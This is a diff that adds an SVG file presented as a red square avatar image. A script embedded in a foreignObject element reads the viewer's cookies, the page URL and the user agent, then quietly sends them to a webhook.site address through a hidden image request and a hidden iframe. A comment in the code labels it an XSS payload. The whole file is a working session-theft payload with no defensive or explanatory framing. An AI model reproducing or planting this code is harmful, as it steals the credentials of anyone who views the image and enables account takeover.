@@ -1,0 +1,41 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100">
+  <!-- 红色圆角矩形作为头像 -->
+  <rect x="10" y="10" width="80" height="80" rx="10" ry="10" fill="#ff6b6b" stroke="#333" stroke-width="2"/>
+  
+  <!-- 使用foreignObject包装HTML内容 -->
+  <foreignObject width="100" height="100">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>
+        // 延迟执行，确保页面加载完成
+        setTimeout(function() {
+          try {
+            // 获取当前页面的cookie
+            var cookies = document.cookie;
+            var currentUrl = window.location.href;
+            var userAgent = navigator.userAgent;
+            
+            // 构造要发送的数据
+            var data = 'cookies=' + encodeURIComponent(cookies) + 
+                      '&amp;url=' + encodeURIComponent(currentUrl) + 
+                      '&amp;ua=' + encodeURIComponent(userAgent) +
+                      '&amp;timestamp=' + encodeURIComponent(new Date().toISOString());
+            
+            // 通过图片请求发送数据（最兼容的方式）
+            var img = new Image();
+            img.src = 'https://webhook.site/c8b5a4d2-7c3e-4f1a-9b2d-8e6f5a3c1d9e?' + data;
+            
+            // 备用方案：创建隐藏的iframe
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://webhook.site/c8b5a4d2-7c3e-4f1a-9b2d-8e6f5a3c1d9e?' + data;
+            document.body.appendChild(iframe);
+            
+          } catch(e) {
+            // 静默处理错误
+            console.log('XSS payload executed with error:', e);
+          }
+        }, 1000);
+      </script>
+    </div>
+  </foreignObject>
+</svg>
